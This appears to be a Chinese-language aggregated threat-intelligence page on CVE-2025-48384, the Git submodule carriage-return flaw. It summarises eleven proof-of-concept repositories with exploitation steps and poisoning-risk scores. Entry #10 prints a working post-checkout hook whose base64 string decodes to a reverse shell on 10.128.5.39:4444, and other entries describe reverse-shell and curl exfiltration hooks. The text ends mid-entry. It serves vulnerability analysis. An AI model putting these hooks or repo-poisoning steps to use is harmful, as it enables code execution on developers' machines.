# CVE-2025-48384

> 📦 该CVE有 **35** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 需要克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 40%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆该仓库时，可能导致任意文件写入。该漏洞源于 Git 在处理 submodule 时存在缺陷。通过在 `.gitmodules` 文件中构造恶意的路径，攻击者可以控制 `git clone` 命令将文件写入到非预期的位置。 

POC有效性分析：
根据搜索结果和POC代码（liamg/CVE-2025-48384），该漏洞存在可利用性。POC代码包含一个 `.gitmodules` 文件和一个 `post-checkout` 脚本。`.gitmodules` 文件中定义了一个恶意 submodule，其路径被设置为一个绝对路径，指向系统中的敏感位置。`post-checkout` 脚本会在 `git clone` 之后自动执行，从而完成任意文件写入。执行 POC 需要先创建一个包含恶意 `.gitmodules` 文件的 Git 仓库，然后诱导用户克隆该仓库。当用户克隆仓库时，Git 会解析 `.gitmodules` 文件，并尝试初始化 submodule。由于 submodule 的路径被设置为恶意路径，Git 会将文件写入到该路径所指向的位置。

利用步骤：
1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. 将恶意仓库托管到公共代码托管平台或通过其他方式传播给目标用户。
3. 诱导目标用户克隆该仓库。
4. 当用户克隆仓库时，`post-checkout` 脚本被执行，完成任意文件写入。

投毒风险分析：
该POC的投毒风险为中等。虽然 POC 本身的功能是演示任意文件写入漏洞，但攻击者可能利用该漏洞进行恶意活动，例如：
*   植入后门：攻击者可以将恶意代码写入到系统启动脚本或常用工具中，从而在用户系统上植入后门。
*   篡改配置文件：攻击者可以修改系统配置文件，例如 SSH 配置文件，从而控制用户系统。
*   窃取敏感信息：攻击者可以将用户敏感信息，例如 SSH 密钥，写入到公共目录，从而窃取用户敏感信息。

该POC的 `post-checkout` 脚本包含 `echo` 和 `id` 命令，这本身不是恶意代码。但是，攻击者可以修改该脚本，使其包含更具破坏性的恶意代码。此外，该POC使用绝对路径来指定 submodule 的位置，这可能会引起用户的怀疑。攻击者可以通过使用相对路径或环境变量来隐藏恶意路径，从而提高攻击的隐蔽性。由于该漏洞影响 Git，一个被广泛使用的版本控制系统，因此利用该漏洞进行大规模攻击是可能的。但是，由于利用该漏洞需要用户克隆恶意仓库，因此攻击的成功率取决于用户的警惕性。
总的来说，该漏洞的投毒风险为中等，约为40%。攻击者可以利用该漏洞进行恶意活动，但攻击的成功率取决于用户的警惕性和攻击者的技术水平。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆恶意Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384是一个存在于Git中的高危漏洞，允许攻击者创建恶意的Git仓库，当用户克隆这些仓库时，可能导致任意文件写入。根据搜索结果，该漏洞与`git clone`子模块有关，通过精心构造的`.gitmodules`文件以及其他Git配置，可能实现在克隆过程中写入任意文件，进而执行恶意代码。

**POC有效性分析：**

根据已找到的POC代码（/tmp/vulnwatchdog_569f31ff6b5166501e6218f8839f5620/post-checkout），攻击者可以在`post-checkout`钩子中插入恶意命令。当用户克隆包含此恶意钩子的仓库时，`post-checkout`脚本会被执行。示例代码中的`ping wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`表明PoC的目的是通过DNS请求来验证漏洞是否被成功触发。这可以用于简单地检测漏洞的存在，但实际攻击中可以替换为任意恶意命令，例如下载并执行payload，或修改系统配置。

利用该漏洞，攻击者可以诱导用户克隆恶意仓库，从而在用户系统上执行任意代码。考虑到Git的广泛使用，尤其是在开发环境中，该漏洞的影响范围非常大。成功利用该漏洞可能导致敏感信息泄露、系统被完全控制等严重后果。

**利用步骤：**

1.  攻击者创建一个包含恶意`.gitmodules`和`post-checkout`钩子的Git仓库。
2.  攻击者诱导受害者克隆此仓库（例如，通过社交工程、钓鱼邮件等）。
3.  当受害者执行`git clone`命令时，恶意`post-checkout`钩子被触发，执行攻击者预设的恶意命令。

**投毒风险分析：**

此PoC的投毒风险较高，初步判断为60%。原因如下：

1.  **恶意代码执行：** PoC通过`post-checkout`钩子执行命令，允许攻击者在受害者机器上执行任意代码。如果攻击者将恶意代码嵌入到广泛使用的开源项目中，并诱导开发者clone，影响范围会进一步扩大。
2.  **命令注入：** 尽管PoC中的示例代码只是一个简单的`ping`命令，但攻击者可以将其替换为更复杂的恶意命令，例如下载并执行恶意脚本，这大大增加了投毒的潜在危害。
3.  **传播方式：** 该漏洞可以通过Git仓库进行传播，这意味着攻击者可以将恶意代码隐藏在看似正常的代码库中，并利用开发者之间的协作关系进行传播。考虑到软件供应链攻击的日益严重，这种投毒方式的危害性不可忽视。

为了降低投毒风险，组织应加强对Git仓库的审计，确保代码的安全性，并对克隆的仓库进行安全检查。同时，应教育开发者提高安全意识，避免克隆来源不明的仓库。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384 - Git 任意文件写入导致远程代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入导致远程代码执行

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定，参考GitHub advisory

**利用条件:** 需要用户执行git clone --recursive操作，攻击者可控制的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是Git中的一个关键漏洞，允许攻击者在执行`git clone --recursive`操作期间写入任意文件。此漏洞可能通过恶意的.gitmodules文件、符号链接和Git hooks导致远程代码执行（RCE）。此漏洞影响Linux和macOS平台，Windows不受影响。

POC有效性分析：提供的POC包含一个Python扫描器，用于检测利用CVE-2025-48384的潜在恶意Git仓库。扫描器检查`.gitmodules`文件中的可疑条目（包含`..`或以`\r`结尾的路径）、指向hooks的符号链接以及可执行的hooks脚本。POC的`cve_2025_48384_auto_print_scanner.py`脚本通过以下步骤检测漏洞：1. 读取`.gitmodules`文件并查找`path`条目，检查是否存在`..`（目录遍历）或以`\r`（回车符）结尾的情况，这可能导致文件写入到预期位置之外。2. 在仓库中查找指向`.git/hooks`目录的符号链接，这些链接可能被用来劫持Git hook执行流程。3. 查找仓库中可执行的Git hooks（如`post-checkout`，`post-merge`，`pre-commit`，`pre-push`，`post-commit`等）。这些hooks如果被恶意修改，可以在特定的Git操作期间执行任意代码。

利用步骤：攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件包含指向仓库外部或包含回车符的子模块路径。攻击者还可以创建指向`.git/hooks`目录的符号链接，或者直接包含恶意的可执行Git hooks。当受害者使用`git clone --recursive`克隆此仓库时，恶意`.gitmodules`文件可能导致Git写入任意文件，符号链接可能劫持Git hook执行，可执行的hooks会被执行，从而导致RCE。

投毒风险分析：该POC包含一个扫描器，其本身不包含直接的恶意代码，但它可以被修改以包含恶意行为。该POC的投毒风险主要来自于以下几个方面：1. 扫描器可以被修改为在检测到漏洞后，自动执行某些操作，例如下载并执行恶意payload。2. 扫描器可以被修改为将扫描结果发送到远程服务器，从而泄露敏感信息。3. 扫描器可能依赖于外部库，这些库可能包含漏洞或恶意代码。4. 扫描器生成的报告可能被篡改，以误导用户或隐藏潜在的漏洞。 由于该POC的代码相对清晰，主要使用标准库，并且没有明显的恶意行为，因此投毒风险为中等，约为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本未知，请参考GitHub advisory获取更多信息。

**利用条件:** 需要克隆恶意Git仓库，并递归初始化子模块

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过创建恶意的Git仓库来执行任意文件写入。该漏洞主要存在于Git客户端处理子模块的方式中。当用户克隆一个包含恶意配置的仓库，并且使用`--recurse-submodules`选项初始化子模块时，攻击者可以利用`.gitmodules`文件中的特殊构造，在目标系统上写入任意文件。

**POC有效性分析：**
根据提供的POC代码，攻击者可以通过构造包含恶意`.gitmodules`文件的Git仓库来利用此漏洞。该文件指定了子模块的URL和路径，当用户使用`git clone --recurse-submodules`命令克隆仓库时，Git客户端会尝试初始化这些子模块。攻击者可以在子模块的路径中嵌入特殊字符，例如换行符，来欺骗Git客户端，使其将子模块的内容写入到非预期的位置。提供的POC代码使用一个名为`sub`的子模块，并将恶意代码放置在`.git/modules/sub/hooks/post-checkout`中，从而实现远程代码执行。通过修改子模块路径，攻击者可以在目标系统上写入任意文件，从而控制系统。

**利用步骤：**
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将该仓库托管在公共或私有Git服务器上。
3. 攻击者诱使用户克隆该仓库，并使用`--recurse-submodules`选项初始化子模块，例如：`git -c protocol.file.allow=always clone --recurse-submodules git@github.com:liamg/CVE-2025-48384.git`。
4. 当Git客户端尝试初始化子模块时，恶意代码会被写入到目标系统的`.git/modules/sub/hooks/post-checkout`文件中。
5. 当用户执行与子模块相关的Git操作时（例如切换分支），`post-checkout`钩子会被触发，从而执行攻击者写入的恶意代码。

**投毒风险分析：**
该漏洞的投毒风险较低，主要原因是该POC利用方式比较直接，没有明显的混淆或隐藏恶意代码的行为。虽然攻击者可以修改子模块的内容以执行恶意操作，但这种行为很容易被发现。此外，由于该漏洞依赖于用户显式地使用`--recurse-submodules`选项，因此攻击者需要诱使用户执行此操作，增加了攻击的难度。总体而言，该POC的投毒风险较低，大约在10%左右。恶意代码主要体现在`post-checkout`钩子的利用上，若将代码修改为下载执行外部脚本，则投毒风险会升高。攻击者可以尝试使用一些简单的编码方式来混淆`post-checkout`脚本中的代码，例如base64编码或简单的异或操作，但这并不会显著增加投毒风险。通过分析该POC的代码，可以发现其主要依赖于Git的内置功能和标准库，没有使用任何可疑的第三方库或API。因此，可以认为该POC的投毒风险较低。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。攻击者可以创建一个包含恶意的`.gitmodules`文件的Git仓库，当用户克隆这个仓库时，Git会自动初始化并配置子模块。恶意`.gitmodules`文件可以被构造来写入任意文件，从而导致远程代码执行。该漏洞的POC代码可在GitHub上找到，由liamg维护。该POC的有效性在于利用了Git子模块的特性，`.gitmodules`文件中指定的路径没有被充分过滤，从而允许写入仓库目录之外的文件。利用步骤如下：

1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者诱导用户克隆该仓库。
3. 当用户克隆仓库时，Git会自动处理`.gitmodules`文件，并尝试初始化和配置子模块。
4. 由于`.gitmodules`文件包含恶意配置，Git会将文件写入到指定的位置，从而导致任意文件写入。
5. 写入的文件可以包含shell脚本或其他可执行代码，从而允许攻击者执行任意命令。

根据搜索结果，Git官方已经发布了补丁来修复此漏洞。建议受影响的用户尽快更新到最新版本。

**投毒风险分析：**
此POC的投毒风险中等。虽然POC本身的代码比较简单，主要是创建一个恶意`.gitmodules`文件和一个简单的shell脚本，但是`.gitmodules`文件的恶意构造方式可能被用于隐藏更复杂的恶意代码。例如，攻击者可以将`.gitmodules`文件配置为从远程服务器下载并执行恶意脚本，或者将恶意代码嵌入到看似无害的文件中。此外，由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学手段诱导用户克隆恶意仓库，从而扩大攻击范围。该POC脚本创建了`/tmp/CVE-2025-48384`文件，表明了其利用目标系统的能力。虽然这个行为本身是良性的PoC验证，但攻击者可以轻易替换成更具破坏性的操作。因此，需要警惕利用此漏洞进行投毒攻击的可能性，并采取相应的防御措施，例如对`.gitmodules`文件进行严格的校验和过滤，以及加强对Git仓库来源的审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 未知

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。该漏洞允许攻击者通过创建恶意的Git仓库，并在用户克隆该仓库时，在用户系统上写入任意文件，从而可能导致远程代码执行。该漏洞的根源在于Git处理submodule的方式存在缺陷，当.gitmodules文件包含恶意配置时，Git可能会在不进行充分验证的情况下写入文件。 

POC有效性分析：

根据搜索结果和提供的POC代码，该漏洞的POC已经存在，并且在GitHub上可以找到相应的代码。通过分析POC代码，可以确认该漏洞是可利用的。POC代码展示了一个简单的bash脚本，该脚本在受害者机器上建立反向shell连接到攻击者的IP地址。要验证该POC的有效性，需要搭建一个Git服务器，创建一个包含恶意.gitmodules文件的仓库，然后尝试在受害者机器上克隆该仓库。如果成功建立了反向shell连接，则说明该漏洞是可利用的。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱骗受害者克隆该仓库。
3. 受害者克隆仓库时，Git会解析.gitmodules文件。
4. 由于.gitmodules文件包含恶意配置，Git会在受害者系统上写入任意文件，从而导致代码执行。
5. 在给定的POC中，恶意.gitmodules配置会导致执行`post-checkout`脚本，此脚本会创建一个反向shell连接到攻击者的机器。

投毒风险分析：
该POC的投毒风险属于中等水平。尽管提供的POC代码本身看起来比较简单，只是建立了一个反向shell连接，但是攻击者可以很容易地修改POC代码，使其执行更具破坏性的操作，例如删除文件、安装恶意软件或窃取敏感数据。此外，攻击者还可以通过代码混淆等技术来隐藏恶意代码，从而增加检测的难度。由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学等手段来诱骗用户克隆恶意仓库，从而扩大攻击范围。例如，攻击者可以在GitHub等代码托管平台上发布包含恶意.gitmodules文件的项目，并诱导其他用户克隆这些项目。此外，如果攻击者能够控制目标组织的内部Git服务器，那么他们就可以更加容易地发起攻击。因此，需要对该漏洞保持警惕，并采取相应的安全措施来防范潜在的攻击。

由于POC本身包含网络连接行为，有一定的投毒风险。攻击者可能通过替换反向shell的IP地址，将受害者连接到恶意服务器，或者在反向shell中执行恶意指令。 混淆代码或添加额外的恶意功能也可能增加投毒风险。该POC的投毒风险评估为30%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是一个Git中的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当用户克隆这个仓库时，恶意文件会被写入到用户的文件系统中，从而可能导致远程代码执行。

POC有效性分析：
根据搜索结果和POC代码，这个漏洞与`.gitmodules`文件的处理方式有关。攻击者可以在`.gitmodules`文件中嵌入恶意配置，当用户克隆包含这个文件的仓库时，Git客户端会解析这个文件，并执行其中的恶意操作。POC代码`post-checkout`中包含一个`curl`命令，该命令尝试向一个外部服务器发送包含用户名的请求，证明POC可以执行恶意命令。POC代码中包含了一个简单的利用场景，即在`post-checkout`脚本中执行curl命令，但这只是一个概念验证，攻击者可以利用这个漏洞执行更复杂的操作，例如写入恶意文件、修改系统配置等。 通过分析 liamg/CVE-2025-48384 项目，该项目提供了 PoC，表明该漏洞确实存在且可被利用，进一步验证了该漏洞的有效性。结合Arctic Wolf的报告，该漏洞的严重性被确认为高危，需要及时修复。

利用步骤：
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将这个仓库托管到一个公开的Git服务器上，或者通过其他方式诱使用户克隆这个仓库。
3. 用户克隆这个仓库。
4. Git客户端解析`.gitmodules`文件，并执行其中的恶意操作。
5. 恶意文件被写入到用户的文件系统中，或者其他恶意操作被执行。

投毒风险分析：
这个POC的投毒风险属于中等。虽然POC代码本身比较简单，只包含一个curl命令，但是攻击者可以很容易地将这个POC扩展到更复杂的攻击场景。例如，攻击者可以在`.gitmodules`文件中嵌入更复杂的脚本，或者利用这个漏洞下载并执行恶意文件。另外，由于这个漏洞涉及到Git客户端的解析过程，攻击者还可以利用这个漏洞绕过一些安全防护机制。在这个特定的POC中，存在一个对外部URL的curl请求。虽然这个请求本身并不一定是恶意的，但它可能会泄露用户信息，或者被用于恶意目的。如果这个请求的目标服务器被攻击者控制，那么攻击者就可以利用这个请求来执行更复杂的攻击。
此外，由于POC发布在公共代码托管平台，存在被恶意修改的风险，例如植入后门、添加恶意依赖等。用户在使用POC时需要仔细审查代码，确保其安全性。
综合考虑，这个POC的投毒风险为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-483


---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

